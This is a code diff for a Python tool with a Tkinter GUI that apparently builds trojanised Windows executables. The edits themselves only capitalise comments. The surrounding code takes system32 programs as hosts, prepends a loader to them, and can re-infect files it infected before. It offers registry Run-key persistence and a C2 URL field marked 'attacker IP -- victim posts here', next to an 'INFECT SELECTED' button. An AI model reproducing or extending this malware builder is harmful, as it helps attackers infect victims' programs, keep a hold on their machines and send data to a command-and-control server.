@@ -215,7 +215,7 @@ def add(paths):
 def sys_hosts():
     return [os.path.join(sys32(), n) for n in CURATED if os.path.exists(os.path.join(sys32(), n))]
 
-# ------------------------------------------------------------------ sink + loader
+# ------------------------------------------------------------------ Sink + loader
 NEWCONSOLE = 0x00000010 if sys.platform == "win32" else 0
 SINK_PROC = {"proc": None}
 
@@ -306,7 +306,7 @@ def build_infected(host_path, c2_url="", persist=False, log=print):
         with open(host_path, "rb") as f: host_bytes = f.read()
     except Exception as ex:
         log("[!] error reading files: %s" % ex); return None
-    # if the host was previously infected, extract the original host from within it
+    # If the host was previously infected, extract the original host from within it.
     hidx = host_bytes.rfind(MAGIC)
     if hidx != -1 and hidx > len(host_bytes) - 12:
         old_hlen = struct.unpack_from("<I", host_bytes, hidx - 4)[0]
@@ -324,7 +324,7 @@ def build_infected(host_path, c2_url="", persist=False, log=print):
     if persist:
         log("[+] persistence: enabled (registry Run key)")
     out = loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC
-    # output to ifec/
+    # Output to ifec/
     IFEC = os.path.join(HERE, "ifec")
     os.makedirs(IFEC, exist_ok=True)
     bname = os.path.basename(host_path)
@@ -456,7 +456,7 @@ def gui():
                            command=toggle_theme, width=7)
     btn_theme.pack(side="right")
 
-    # ---- status bar
+    # ---- Status bar
     stbar = ttk.Frame(root)
     stbar.pack(fill="x", padx=12, pady=(0, 4))
     lbl_st1 = ttk.Label(stbar, text="", style="Status.TLabel")
@@ -501,7 +501,7 @@ def gui():
     UI["tree"] = tree
     apply_theme(root, UI["theme"])
 
-    # ---- action bar
+    # ---- Action bar
     ab = ttk.Frame(root)
     ab.pack(fill="x", padx=12, pady=(4, 2))
     def do_add():
@@ -550,7 +550,7 @@ def gui():
     c2f = ttk.Frame(root)
     c2f.pack(fill="x", padx=12, pady=(2, 2))
     ttk.Label(c2f, text="C2 URL:", style="Dim.TLabel").pack(side="left", padx=(0,4))
-    # default: attacker's local IP (not 127.0.0.1 -- doesn't work if victim is another machine)
+    # default: attacker's local IP (not 127.0.0.1 -- doesn't work if victim is another machine).
     import socket as _sock
     _local_ip = "127.0.0.1"
     try:
@@ -564,7 +564,7 @@ def gui():
             _local_ip = _sock.gethostbyname(_sock.gethostname())
         except Exception:
             pass
-    # discard invalid IPs (169.254.x.x = APIPA, 0.0.0.0)
+    # Discard invalid IPs (169.254.x.x = APIPA, 0.0.0.0).
     if _local_ip.startswith("0.") or _local_ip.startswith("169.254."):
         _local_ip = "127.0.0.1"
     c2var = tk.StringVar(value="http://%s:%d/" % (_local_ip, saved_port()))
@@ -572,7 +572,7 @@ def gui():
     c2entry.pack(side="left", fill="x", expand=True)
     ttk.Label(c2f, text="(attacker IP -- victim posts here)", style="Dim.TLabel").pack(side="left", padx=(6,0))
 
-    # ---- main action buttons (2 columns)
+    # ---- Main action buttons (2 columns)
     act2 = ttk.Frame(root)
     act2.pack(fill="x", padx=12, pady=(2, 4))
     btn_go = ttk.Button(act2, text="INFECT SELECTED", style="Act.TButton")
@@ -601,7 +601,7 @@ def gui():
         log.insert("end", s + "\n", tag)
         log.see("end")
 
-    # ---- results bar
+    # ---- Results bar
     rb = ttk.Frame(root)
     rb.pack(fill="x", padx=12, pady=(0, 8))
     def show_json():
